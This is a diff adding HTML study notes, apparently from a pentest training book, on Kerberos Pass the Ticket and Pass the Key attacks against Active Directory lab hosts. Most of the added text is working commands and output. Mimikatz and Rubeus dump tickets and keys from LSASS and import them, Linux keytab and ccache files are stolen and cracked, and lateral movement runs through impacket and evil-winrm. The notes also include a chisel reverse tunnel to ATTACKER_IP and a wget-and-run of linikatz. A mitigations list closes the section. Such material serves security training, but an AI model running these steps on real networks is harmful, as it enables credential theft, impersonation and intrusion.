+<li>DC validates the user’s identity by decrypting the timestamp (DC knows the user’s password hash)</li>
+<li>DC sends the user a TGT for future requests</li>
+<li>User presents TGT to request TGS for specific services</li>
+<li>User presents TGS to the target service for authentication</li>
+</ol>
+<p>Once the user has their TGT, they do not have to prove who they are with their password again.</p>
+<hr>
+<h2 id="prerequisites-1"><a class="header" href="#prerequisites-1">Prerequisites</a></h2>
+<p>To perform a Pass the Ticket attack, you need a valid Kerberos ticket:</p>
+<ul>
+<li><strong>Service Ticket (TGS)</strong> - Allows access to a particular resource</li>
+<li><strong>Ticket Granting Ticket (TGT)</strong> - Can be used to request service tickets for any resource the user has privileges to access</li>
+</ul>
+<p>Tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. As a non-administrative user, you can only get your own tickets. As a local administrator, you can collect all tickets on the system.</p>
+<hr>
+<h2 id="harvesting-kerberos-tickets"><a class="header" href="#harvesting-kerberos-tickets">Harvesting Kerberos Tickets</a></h2>
+<h3 id="using-mimikatz-1"><a class="header" href="#using-mimikatz-1">Using Mimikatz</a></h3>
+<p>Export all tickets from the system:</p>
+<pre><code class="language-cmd">c:\tools&gt; mimikatz.exe
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::tickets /export
+
+Authentication Id : 0 ; 329278 (00000000:0005063e)
+Session           : Network from 0
+User Name         : DC01$
+Domain            : HTB
+Logon Server      : (null)
+Logon Time        : 7/12/2022 9:39:55 AM
+SID               : S-1-5-18
+
+         * Username : DC01$
+         * Domain   : inlanefreight.htb
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+         [00000000]
+           Start/End/MaxRenew: 7/12/2022 9:39:55 AM ; 7/12/2022 7:39:54 PM ;
+           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ inlanefreight.htb
+           Target Name  (--) : @ inlanefreight.htb
+           Client Name  (01) : DC01$ ; @ inlanefreight.htb
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
+           * Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !
+
+        Group 2 - Ticket Granting Ticket
+</code></pre>
+<p>The result is a list of <code>.kirbi</code> files containing the tickets.</p>
+<p><strong>Ticket Naming Convention:</strong></p>
+<ul>
+<li>Tickets ending with <code>$</code> correspond to computer accounts</li>
+<li>User tickets: <code>[randomvalue]-username@service-domain.local.kirbi</code></li>
+<li>Tickets with service <code>krbtgt</code> correspond to the TGT for that account</li>
+</ul>
+<h3 id="using-rubeus"><a class="header" href="#using-rubeus">Using Rubeus</a></h3>
+<p>Export tickets in Base64 format (use <code>/nowrap</code> for easier copy-paste):</p>
+<pre><code class="language-cmd">c:\tools&gt; Rubeus.exe dump /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+Action: Dump Kerberos Ticket Data (All Users)
+
+[*] Current LUID    : 0x6c680
+    ServiceName           :  krbtgt/inlanefreight.htb
+    ServiceRealm          :  inlanefreight.htb
+    UserName              :  DC01$
+    UserRealm             :  inlanefreight.htb
+    StartTime             :  7/12/2022 9:39:54 AM
+    EndTime               :  7/12/2022 7:39:54 PM
+    RenewTill             :  7/19/2022 9:39:54 AM
+    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+    KeyType               :  aes256_cts_hmac_sha1
+    Base64(key)           :  KWBMpM4BjenjTniwH0xw8FhvbFSf+SBVZJJcWgUKi3w=
+    Base64EncodedTicket   :  doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lh...
+</code></pre>
+<p><strong>Note:</strong> Mimikatz version 2.2.0 20220919 may show all hashes as <code>des_cbc_md4</code> on some Windows 10 versions. Exported tickets may not work correctly. Use Rubeus as an alternative.</p>
+<hr>
+<h2 id="pass-the-key--overpass-the-hash-1"><a class="header" href="#pass-the-key--overpass-the-hash-1">Pass the Key / OverPass the Hash</a></h2>
+<p>This technique converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full TGT.</p>
+<h3 id="extract-kerberos-keys-with-mimikatz"><a class="header" href="#extract-kerberos-keys-with-mimikatz">Extract Kerberos Keys with Mimikatz</a></h3>
+<pre><code class="language-cmd">c:\tools&gt; mimikatz.exe
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::ekeys
+
+Authentication Id : 0 ; 444066 (00000000:0006c6a2)
+Session           : Interactive from 1
+User Name         : plaintext
+Domain            : HTB
+Logon Server      : DC01
+Logon Time        : 7/12/2022 9:42:15 AM
+SID               : S-1-5-21-228825152-3134732153-3833540767-1107
+
+         * Username : plaintext
+         * Domain   : inlanefreight.htb
+         * Password : (null)
+         * Key List :
+           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
+           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
+</code></pre>
+<h3 id="mimikatz---pass-the-key"><a class="header" href="#mimikatz---pass-the-key">Mimikatz - Pass the Key</a></h3>
+<p>Using NTLM hash (RC4):</p>
+<pre><code class="language-cmd">mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+
+user    : plaintext
+domain  : inlanefreight.htb
+program : cmd.exe
+impers. : no
+NTLM    : 3f74aa8f08f712f09cd5177b5c1ce50f
+  |  PID  1128
+  |  TID  3268
+  |  LSA Process is now R/W
+  |  LUID 0 ; 3414364 (00000000:0034195c)
+  \_ msv1_0   - data copy @ 000001C7DBC0B630 : OK !
+  \_ kerberos - data copy @ 000001C7E20EE578
+   \_ rc4_hmac_nt       OK
+   \_ *Password replace @ 000001C7E2136BC8 (32) -&gt; null
+</code></pre>
+<p>This spawns a new cmd.exe window in the context of the target user.</p>
+<h3 id="rubeus---pass-the-key-asktgt"><a class="header" href="#rubeus---pass-the-key-asktgt">Rubeus - Pass the Key (asktgt)</a></h3>
+<p>Using AES-256 hash:</p>
+<pre><code class="language-cmd">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+
+[*] Action: Ask TGT
+
+[*] Using aes256_cts_hmac_sha1 hash: b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
+[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
+[*] Using domain controller: 10.129.203.120:88
+[+] TGT request successful!
+[*] Base64(ticket.kirbi):
+
+      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRC...
+
+[+] Ticket successfully imported!
+</code></pre>
+<hr>
+<h2 id="pass-the-ticket-1"><a class="header" href="#pass-the-ticket-1">Pass the Ticket</a></h2>
+<h3 id="rubeus---import-kirbi-file"><a class="header" href="#rubeus---import-kirbi-file">Rubeus - Import .kirbi File</a></h3>
+<pre><code class="language-cmd">c:\tools&gt; Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+
+[*] Action: Import Ticket
+[+] ticket successfully imported!
+
+c:\tools&gt; dir \\DC01.inlanefreight.htb\c$
+Directory: \\dc01.inlanefreight.htb\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/4/2022  11:17 AM                Program Files
+d-----         6/4/2022  11:17 AM                Program Files (x86)
+...
+</code></pre>
+<h3 id="rubeus---import-base64-ticket"><a class="header" href="#rubeus---import-base64-ticket">Rubeus - Import Base64 Ticket</a></h3>
+<p>Convert .kirbi to Base64:</p>
+<pre><code class="language-powershell">PS c:\tools&gt; [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
+
+doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQ...
+</code></pre>
+<p>Import Base64 ticket:</p>
+<pre><code class="language-cmd">c:\tools&gt; Rubeus.exe ptt /ticket:doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQ...
+
+[+] Ticket successfully imported!
+</code></pre>
+<h3 id="mimikatz---pass-the-ticket"><a class="header" href="#mimikatz---pass-the-ticket">Mimikatz - Pass the Ticket</a></h3>
+<pre><code class="language-cmd">mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+
+* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK
+
+mimikatz # exit
+Bye!
+
+c:\tools&gt; powershell
+PS C:\tools&gt; Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents&gt; whoami
+inlanefreight\john
+</code></pre>
+<hr>
+<h2 id="rubeus---sacrificial-process-for-lateral-movement"><a class="header" href="#rubeus---sacrificial-process-for-lateral-movement">Rubeus - Sacrificial Process for Lateral Movement</a></h2>
+<p>Using <code>createnetonly</code> creates a sacrificial process/logon session (Logon type 9), equivalent to <code>runas /netonly</code>. This prevents erasure of existing TGTs for the current logon session.</p>
+<h3 id="create-sacrificial-process"><a class="header" href="#create-sacrificial-process">Create Sacrificial Process</a></h3>
+<pre><code class="language-cmd">C:\tools&gt; Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+
+[*] Action: Create process (/netonly)
+
+[*] Using random username and password.
+
+[*] Showing process : True
+[*] Username        : JMI8CL7C
+[*] Domain          : DTCDV6VL
+[*] Password        : MRWI6XGI
+[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 1556
+[+] LUID            : 0xe07648
+</code></pre>
+<h3 id="request-tgt-and-import-in-sacrificial-process"><a class="header" href="#request-tgt-and-import-in-sacrificial-process">Request TGT and Import in Sacrificial Process</a></h3>
+<p>From the new cmd window:</p>
+<pre><code class="language-cmd">C:\tools&gt; Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+
+[+] TGT request successful!
+[+] Ticket successfully imported!
+
+C:\tools&gt; powershell
+PS C:\tools&gt; Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents&gt; whoami
+inlanefreight\john
+[DC01]: PS C:\Users\john\Documents&gt; hostname
+DC01
+</code></pre>
+<hr>
+<h2 id="summary-of-key-commands"><a class="header" href="#summary-of-key-commands">Summary of Key Commands</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Command</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td>Mimikatz</td><td><code>sekurlsa::tickets /export</code></td><td>Export all tickets to .kirbi files</td></tr>
+<tr><td>Mimikatz</td><td><code>sekurlsa::ekeys</code></td><td>Extract Kerberos encryption keys</td></tr>
+<tr><td>Mimikatz</td><td><code>kerberos::ptt &lt;file.kirbi&gt;</code></td><td>Import ticket into current session</td></tr>
+<tr><td>Rubeus</td><td><code>dump /nowrap</code></td><td>Dump all tickets in Base64</td></tr>
+<tr><td>Rubeus</td><td><code>asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;hash&gt; /ptt</code></td><td>Request TGT with hash and import</td></tr>
+<tr><td>Rubeus</td><td><code>ptt /ticket:&lt;file or base64&gt;</code></td><td>Import ticket into current session</td></tr>
+<tr><td>Rubeus</td><td><code>createnetonly /program:cmd.exe /show</code></td><td>Create sacrificial logon session</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="pass-the-ticket-from-linux"><a class="header" href="#pass-the-ticket-from-linux">Pass the Ticket from Linux</a></h2>
+<p>Linux computers connected to Active Directory commonly use Kerberos for authentication. If you compromise a Linux machine connected to AD, you can find Kerberos tickets to impersonate other users.</p>
+<p><strong>Note:</strong> A Linux machine doesn’t need to be domain-joined to use Kerberos tickets. Scripts and applications can use Kerberos to authenticate to the network.</p>
+<h3 id="kerberos-ticket-storage-on-linux"><a class="header" href="#kerberos-ticket-storage-on-linux">Kerberos Ticket Storage on Linux</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Storage Type</th><th>Location</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>ccache files</strong></td><td><code>/tmp/krb5cc_*</code></td><td>Default ticket cache files, location stored in <code>KRB5CCNAME</code> environment variable</td></tr>
+<tr><td><strong>Keytab files</strong></td><td><code>/etc/krb5.keytab</code> or custom</td><td>Contains Kerberos principals and encrypted keys for passwordless authentication</td></tr>
+<tr><td><strong>SSSD cache</strong></td><td><code>/var/lib/sss/db/</code></td><td>Used by SSSD for caching credentials</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="identifying-ad-integration"><a class="header" href="#identifying-ad-integration">Identifying AD Integration</a></h3>
+<p>Check if the Linux machine is domain-joined:</p>
+<pre><code class="language-bash"># Using realm
+david@linux01:~$ realm list
+
+inlanefreight.htb
+  type: kerberos
+  realm-name: INLANEFREIGHT.HTB
+  domain-name: inlanefreight.htb
+  configured: kerberos-member
+  server-software: active-directory
+  client-software: sssd
+  required-package: sssd-tools
+  required-package: sssd
+  login-formats: %U@inlanefreight.htb
+  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
+  permitted-groups: Linux Admins
+</code></pre>
+<p>Check for SSSD or Winbind services:</p>
+<pre><code class="language-bash">david@linux01:~$ ps -ef | grep -i "winbind\|sssd"
+
+root  2140  1  0 Sep29 ?  00:00:01 /usr/sbin/sssd -i --logger=files
+root  2141  2140  0 Sep29 ?  00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
+root  2142  2140  0 Sep29 ?  00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
+root  2143  2140  0 Sep29 ?  00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
+</code></pre>
+<hr>
+<h3 id="finding-keytab-files"><a class="header" href="#finding-keytab-files">Finding Keytab Files</a></h3>
+<p>Search for keytab files:</p>
+<pre><code class="language-bash">david@linux01:~$ find / -name *keytab* -ls 2&gt;/dev/null
+
+131610  4 -rw-------  1 root  root  1348 Oct  4 16:26 /etc/krb5.keytab
+262169  4 -rw-rw-rw-  1 root  root   216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
+</code></pre>
+<p>Check for keytab references in cron jobs:</p>
+<pre><code class="language-bash">david@linux01:~$ crontab -l
+
+# Ticket renewal
+kinit -k -t /home/carlos@inlanefreight.htb/.scripts/kerberos/.]carlos.keytab carlos@inlanefreight.htb
+</code></pre>
+<h3 id="listing-keytab-file-principals"><a class="header" href="#listing-keytab-file-principals">Listing Keytab File Principals</a></h3>
+<pre><code class="language-bash">david@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab
+
+Keytab name: FILE:/opt/specialfiles/carlos.keytab
+KVNO Timestamp           Principal
+---- ------------------- ------------------------------------------------------
+   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
+</code></pre>
+<h3 id="impersonating-a-user-with-keytab"><a class="header" href="#impersonating-a-user-with-keytab">Impersonating a User with Keytab</a></h3>
+<pre><code class="language-bash"># Check current ticket
+david@linux01:~$ klist
+
+Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+Default principal: david@INLANEFREIGHT.HTB
+
+Valid starting     Expires            Service principal
+10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+
+# Import keytab (kinit is case-sensitive!)
+david@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+
+# Verify new ticket
+david@linux01:~$ klist
+
+Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+Default principal: carlos@INLANEFREIGHT.HTB
+
+Valid starting     Expires            Service principal
+10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+</code></pre>
+<p>Access resources as the impersonated user:</p>
+<pre><code class="language-bash">david@linux01:~$ smbclient //dc01/carlos -k -c ls
+
+  .                                   D        0  Thu Oct  6 14:46:26 2022
+  ..                                  D        0  Thu Oct  6 14:46:26 2022
+  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022
+</code></pre>
+<p><strong>Tip:</strong> Save your current ccache file before importing a keytab:</p>
+<pre><code class="language-bash">cp $KRB5CCNAME /tmp/krb5cc_backup
+</code></pre>
+<hr>
+<h3 id="extracting-hashes-from-keytab-files"><a class="header" href="#extracting-hashes-from-keytab-files">Extracting Hashes from Keytab Files</a></h3>
+<p>Use KeyTabExtract to extract hashes for offline cracking:</p>
+<pre><code class="language-bash">david@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : INLANEFREIGHT.HTB
+        SERVICE PRINCIPAL : carlos/
+        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
+        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
+</code></pre>
+<p>With these hashes you can:</p>
+<ul>
+<li>Perform Pass the Hash with the NTLM hash</li>
+<li>Forge tickets using AES256/AES128 with Rubeus</li>
+<li>Attempt to crack the hashes offline</li>
+</ul>
+<p><strong>Note:</strong> A keytab file can contain multiple credentials from different users.</p>
+<hr>
+<h3 id="finding-ccache-files"><a class="header" href="#finding-ccache-files">Finding ccache Files</a></h3>
+<p>ccache files are stored in <code>/tmp</code> by default:</p>
+<pre><code class="language-bash">david@linux01:~$ ls -la /tmp/krb5cc_*
+
+-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
+-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
+-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Oct 10 19:55 /tmp/krb5cc_647402606
+</code></pre>
+<p>Check the environment variable for custom locations:</p>
+<pre><code class="language-bash">david@linux01:~$ echo $KRB5CCNAME
+</code></pre>
+<h3 id="using-ccache-files"><a class="header" href="#using-ccache-files">Using ccache Files</a></h3>
+<p>Set the <code>KRB5CCNAME</code> variable to use a specific ccache file:</p>
+<pre><code class="language-bash"># As root, use another user's ccache
+root@linux01:~# export KRB5CCNAME=/tmp/krb5cc_647401106_I8I133
+
+root@linux01:~# klist
+
+Ticket cache: FILE:/tmp/krb5cc_647401106_I8I133
+Default principal: julio@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+
+# Access resources
+root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
+
+  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
+  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
+  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
+  Users                              DR        0  Thu Oct  6 11:46:05 2022
+  Windows                             D        0  Wed Oct  5 13:20:00 2022
+</code></pre>
+<p><strong>Note:</strong> ccache files are temporary and may expire or change during login/logout operations. Check “Valid starting” and “Expires” times with <code>klist</code>.</p>
+<hr>
+<h3 id="using-linux-attack-tools-with-kerberos"><a class="header" href="#using-linux-attack-tools-with-kerberos">Using Linux Attack Tools with Kerberos</a></h3>
+<p>Many Linux tools support Kerberos authentication. Set <code>KRB5CCNAME</code> to point to your ccache file.</p>
+<h4 id="prerequisites-for-non-domain-joined-attack-hosts"><a class="header" href="#prerequisites-for-non-domain-joined-attack-hosts">Prerequisites for Non-Domain-Joined Attack Hosts</a></h4>
+<ol>
+<li>Configure <code>/etc/hosts</code> to resolve domain names:</li>
+</ol>
+<pre><code class="language-bash">$ cat /etc/hosts
+
+172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
+172.16.1.5  ms01.inlanefreight.htb  ms01
+</code></pre>
+<ol start="2">
+<li>Set up a SOCKS proxy (e.g., with Chisel) if needed:</li>
+</ol>
+<pre><code class="language-bash"># On attack host
+$ sudo ./chisel server --reverse
+
+# On pivot host (MS01)
+C:\&gt; chisel.exe client ATTACKER_IP:8080 R:socks
+</code></pre>
+<ol start="3">
+<li>Configure proxychains:</li>
+</ol>
+<pre><code class="language-bash">$ cat /etc/proxychains.conf
+[ProxyList]
+socks5 127.0.0.1 1080
+</code></pre>
+<h4 id="using-impacket-with-kerberos"><a class="header" href="#using-impacket-with-kerberos">Using Impacket with Kerberos</a></h4>
+<pre><code class="language-bash"># Set the ccache file
+$ export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+
+# Use impacket tools with -k flag
+$ proxychains impacket-wmiexec dc01 -k
+
+[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01:445 ... OK
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+inlanefreight\julio
+</code></pre>
+<h4 id="using-evil-winrm-with-kerberos"><a class="header" href="#using-evil-winrm-with-kerberos">Using Evil-WinRM with Kerberos</a></h4>
+<pre><code class="language-bash">$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
+
+[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01:5985 ... OK
+*Evil-WinRM* PS C:\Users\julio\Documents&gt; whoami ; hostname
+inlanefreight\julio
+DC01
+</code></pre>
+<hr>
+<h3 id="converting-tickets-between-formats"><a class="header" href="#converting-tickets-between-formats">Converting Tickets Between Formats</a></h3>
+<p>Use <code>impacket-ticketConverter</code> to convert between ccache (Linux) and kirbi (Windows) formats:</p>
+<h4 id="ccache-to-kirbi"><a class="header" href="#ccache-to-kirbi">ccache to kirbi</a></h4>
+<pre><code class="language-bash">$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] converting ccache to kirbi...
+[+] done
+</code></pre>
+<h4 id="import-kirbi-in-windows"><a class="header" href="#import-kirbi-in-windows">Import kirbi in Windows</a></h4>
+<pre><code class="language-cmd">C:\tools&gt; Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+C:\tools&gt; klist
+
+Cached Tickets: (1)
+
+#0&gt;     Client: julio @ INLANEFREIGHT.HTB
+        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Start Time: 10/10/2022 5:46:02 (local)
+        End Time:   10/10/2022 15:46:02 (local)
+
+C:\tools&gt; dir \\dc01\julio
+ Directory of \\dc01\julio
+
+07/14/2022  04:18 PM                17 julio.txt
+</code></pre>
+<hr>
+<h3 id="linikatz"><a class="header" href="#linikatz">Linikatz</a></h3>
+<p>Linikatz is a tool for extracting credentials from Linux machines integrated with Active Directory (similar to Mimikatz for Windows).</p>
+<p><strong>Requirements:</strong> Must run as root.</p>
+<p><strong>Supported integrations:</strong> FreeIPA, SSSD, Samba, Vintella, and more.</p>
+<pre><code class="language-bash">$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+$ chmod +x linikatz.sh
+$ sudo ./linikatz.sh
+
+ _ _       _ _         _
+| (_)_ __ (_) | ____ _| |_ ____
+| | | '_ \| | |/ / _` | __|_  /
+| | | | | | |   &lt; (_| | |_ / /
+|_|_|_| |_|_|_|\_\__,_|\__/___|
+
+             =[ @timb_machine ]=
+
+I: [sss-check] SSS AD configuration
+I: [kerberos-check] Kerberos configuration
+-rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
+-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
+I: [kerberos-check] User Kerberos tickets
+Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
+Default principal: julio@INLANEFREIGHT.HTB
+...
+</code></pre>
+<p>Linikatz extracts credentials and places them in a folder named <code>linikatz.*</code> containing ccache and keytab files.</p>
+<hr>
+<h3 id="linux-ptt-command-summary"><a class="header" href="#linux-ptt-command-summary">Linux PtT Command Summary</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>realm list</code></td><td>Check if machine is domain-joined</td></tr>
+<tr><td><code>find / -name *keytab* -ls 2&gt;/dev/null</code></td><td>Find keytab files</td></tr>
+<tr><td><code>klist -k -t &lt;keytab&gt;</code></td><td>List principals in keytab</td></tr>
+<tr><td><code>kinit &lt;user&gt; -k -t &lt;keytab&gt;</code></td><td>Import keytab and get TGT</td></tr>
+<tr><td><code>klist</code></td><td>List current Kerberos tickets</td></tr>
+<tr><td><code>export KRB5CCNAME=&lt;ccache&gt;</code></td><td>Set ccache file to use</td></tr>
+<tr><td><code>smbclient //&lt;host&gt;/&lt;share&gt; -k</code></td><td>Access SMB with Kerberos</td></tr>
+<tr><td><code>impacket-ticketConverter &lt;in&gt; &lt;out&gt;</code></td><td>Convert ccache/kirbi formats</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="mitigations-2"><a class="header" href="#mitigations-2">Mitigations</a></h2>
+<ul>
+<li>Enable Credential Guard to protect LSASS</li>
+<li>Use Protected Users security group for sensitive accounts</li>
+<li>Implement Privileged Access Workstations (PAWs)</li>
+<li>Monitor for suspicious Kerberos activity (Event IDs 4768, 4769)</li>
+<li>Regularly rotate service account passwords</li>
+<li>Limit the lifetime of Kerberos tickets via Group Policy</li>
+<li>Restrict permissions on keytab and ccache files on Linux systems</li>
+<li>Use short-lived tickets and enforce ticket renewal</li>
+</ul>
+<hr>
+<h2 id="references-5"><a class="header" href="#references-5">References</a></h2>
+<ul>
+<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz Documentation</a></li>
+<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
+<li><a href="https://www.slideshare.net/gentaboron/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it">Abusing Microsoft Kerberos - Benjamin Delpy &amp; Skip Duckwall</a></li>
+<li><a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a></li>
+<li><a href="https://github.com/CiscoCXSecurity/linikatz">Linikatz</a></li>
+<li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="electronics"><a class="header" href="#electronics">Electronics</a></h1>
 <ul>
